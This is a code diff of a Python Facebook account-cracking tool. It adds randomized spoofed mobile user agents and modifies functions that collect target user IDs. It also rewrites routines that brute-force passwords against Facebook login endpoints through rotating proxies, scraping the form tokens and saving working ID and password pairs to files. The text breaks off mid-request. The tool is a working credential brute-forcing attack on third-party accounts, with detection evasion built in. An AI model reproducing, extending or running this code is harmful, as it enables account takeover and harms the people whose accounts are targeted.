@@ -14,24 +14,26 @@ from rich.columns import Columns as col
 from rich import print as rprint
 from rich import pretty
 from rich.text import Text as tekz
-try:
-        import rich
-except ImportError:
-        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
-        os.system('pip install rich')
-try:
-        import stdiomask
-except ImportError:
-        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
-        os.system('pip install stdiomask')
-try:
-	import requests
-except ImportError:
-	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
-	os.system('pip install requests && pip install mechanize ')
-#------------------[ USER-AGENT ]-------------------#
 pretty.install()
 CON=sol()
+## RANDOM UA
+#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
+uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
+uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
+uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
+uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
+uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
+uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
+#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
+#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
+uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
+uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
+uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
+uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+#------------------[ USER-AGENT ]-------------------#
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -99,6 +101,22 @@ def uaku():
 		for un in aa:
 			ua.write(un+'\n')
 		ua=open('.bbnew.txt','r').read().splitlines()
+		
+#------------------[ USER-AGENT ]-------------------#
+def ua_fb(self):
+        rr = random.randint
+        model = random.choice(['Mi 10 Pro','CPH1909'])
+        ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Mi 10 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/{model};FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
+        au = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))}; vivo 2019 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,329))}.0.0.{str(rr(1,8))}.{str(rr(90,106))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,500000000))};FBCR/Indosat Ooredoo;FBMF/vivo;FBBD/vivo;FBDV/vivo 2019;FBSV/{str(rr(6,10))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        ah = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,14))}; Relami 2020 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,380))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Realmi;FBBD/Realmi;FBDV/Realmi 2020;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        uaa = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Redmi 9 Pro Build/QQ3A.200805.001) [FBAN/MessengerLite;FBAV/{str(rr(40,365))}.0.0.8.106;FBPN/com.facebook.mlite;FBLC/ja_JP;FBBV/417404896;FBCR/Indosat Ooredoo;FBMF/Redmi;FBBD/Redmi;FBDV/{model};FBSV/{str(rr(9,15))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=1080,height=2138};]")
+        gl = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,15))}; Asus 9 Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Asus;FBBD/Asus;FBDV/Asus 2019;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        mp = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,15))};  Redmi 7A Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Asus;FBBD/Redmi;FBDV/Redmi 2020;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        tiger = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,12))};  Redmi 5A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(300,379))}.0.0.{str(rr(1,8))}.{str(rr(90,109))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(400000000,600000000))};FBCR/Indosat Ooredoo;FBMF/Redmi 5A Pro;FBBD/Redmi;FBDV/Redmi 2019;FBSV/{str(rr(6,11))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        revo = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(2,15))};  Redmi 6A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(0,50))}.0.0.{str(rr(1,12))}.{str(rr(5,70))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(3000,4000))};FBCR/Indosat Ooredoo;FBMF/Redmi 5A Pro;FBBD/Redmi;FBDV/Redmi 2019;FBSV/{str(rr(80,120))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        suprahanip = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(3,6))};  Redmi 6A Pro Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/{str(rr(2,5))}.0.0.{str(rr(1,12))}.{str(rr(5,70))};FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/{str(rr(3000,4000))};FBCR/Indosat Ooredoo;FBMF/Realmi C11 Pro;FBBD/Realmi;FBDV/Realmi Pro;FBSV/{str(rr(80,120))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.0,width=720,height=1412};]")
+        kntl = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(1,12))}; M2007J20CG MIUI/V{str(rr(1,12))}.0.{str(rr(1,10))}.0.QJGMIXM) [FBAN/FB4A;FBAV/{str(rr(10,22))}.0.0.0.4;FBLC/in_ID;FBBV/4998186;FBCR/XL;FBMF/Xiaomi;FBBD/POCO;FBDV/M2007J20CG;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/density=2.75,width=1080,height=2179;FB_FW/1;]")
+        return random.choice([ua,au,ah,uaa,gl,mp,tiger,revo,suprahanip,kntl])
 #------------[ INDICATION ]---------------#
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
@@ -340,18 +358,18 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('>> Mau Berapa Target Njing ? : '))
+		jum = int(input(f' ╰─  {P}Mau Berapa Idz Target {x} : '))
 	except ValueError:
-		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		print(' ╰─  Wrong input ')
 		exit()
-	if jum<1 or jum>100:
-		print('>> Gagal Dump Idz ')
+	if jum<1 or jum>80:
+		print(f'{h} ╰─  {x}Pertemanan Tidak Publik  ')
 		exit()
 	ses=requests.Session()
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
+		kl = input(f' ╰─  {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -365,42 +383,19 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			print('>> Sinyal Loh Kek Kontoll ')
+			print(' ╰─  Unstable Signal ')
 			exit()
 	try:
-		print('')
-		print(f'>> Total Idz Yang Terkumpul🔥{h}'+str(len(id)))
+		print(f' ╰─  {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
-		print('>> Sinyal Lo kek Kontol ')
+		print(' ╰─  Unstable Signal ')
 		back()
 	except (KeyError,IOError):
-		print(f'>>{k} Pertemanan Tidak Public {x}')
+		print(f' ╰─  {k} Friendship Not Public {x}')
 		time.sleep(3)
 		back()
-#-------------------[ CRACK-PENGIKUT ]----------------#
-def dump_pengikut():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
-	pil = input('>> Masukkan Idz Target : ')
-	try:
-		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
-		for pi in koh2['subscribers']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
-		exit()
-	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
-		exit()
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
 
@@ -695,18 +690,21 @@ def crack(idf,pwv):
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
+	ua5 = ('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
+	ua6 = ('Mozilla/5.0 (Linux; Android 11; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36')
+	ua7 = ('Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36')
 	ses = requests.Session()
 	for pw in pwv:
 		try:
 			nip=random.choice(prox)
 			proxs= {'http': 'socks4://'+nip}
-			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
+			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
+			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}——>{k} {idf}|{pw}{N}')     
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -755,51 +753,112 @@ def crack(idf,pwv):
 #------------------[ METHODE-MBASIC-2 ]-------------------#
 def crackfree(idf,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r💐 {P}[{bo}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
-	sys.stdout.flush()
+	bi = random.choice(['\x1b[1;92m','\x1b[1;91m','\x1b[1;93m'])
+	pers = loop*100/len(id2)
+	fff = '%'
+	prog.update(des,description=f'{bi}Atsuna{P} [deep_white]{(loop)}/{len(id)}[/] [green]ok[/] : [green]{(ok)} [/][yellow] cp[/] : [yellow]{(cp)}')
+	prog.advance(des)
 	ua = random.choice(ugen)
-	ua2 = random.choice(ugen2)
+	ua = random.choice(ugen2)
+	ua = useragent()
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
-			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
-			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
+			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=678756043864316&kid_directed_site=0&app_id=678756043864316&signed_next=1&next=https://m.facebook.com/v3.2/dialog/oauth?client_id=678756043864316&redirect_uri=https%3A%2F%2Faccounts.livechat.com%2Foauth%2Ffacebook%2Fcallback&scope=email&state=8f705f98-9254-4132-b385-8e242a1d26b0&ret=login&fbapp_pres=0&logger_id=f2cde0d4-1d2b-4670-b977-fdd0f7be9bdb&tp=unspecified&cancel_url=https://accounts.livechat.com/oauth/facebook/callback?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=8f705f98-9254-4132-b385-8e242a1d26b0#_=_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			data = {
+'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
+'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
+'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
+'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
+'email': idf,
+'prefill_contact_point': idf,
+'prefill_source': 'browser_onload',
+'prefill_type': 'password',
+'first_prefill_source': 'browser_dropdown',
+'first_prefill_type': 'contact_point',
+'had_cp_prefilled': 'true',
+'had_password_prefilled': 'true',
+'is_smart_lock': 'false',
+'bi_xrwh': '0',
+"bi_wvdp": '{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
+'fb_dtsg': '',
+'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+'__dyn': '1KiEGiE5q2K14zVQ2mml0BxG6U4a2i5U4e0C86u7E39x60lW4o3Bw4Ewk9E4W0om0MU0D2US0na1gwwyo1nVEdE1u86i0N85G0zE1bE881eEdEG0hi0Lo6-0Co2cw8-',
+'__csr': '',
+'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
+'__a': '',
+'__user':0
+}
+
+
+			headers = {
+    'authority': 'm.facebook.com',
+    'accept': '*/*',
+    'accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://m.facebook.com',
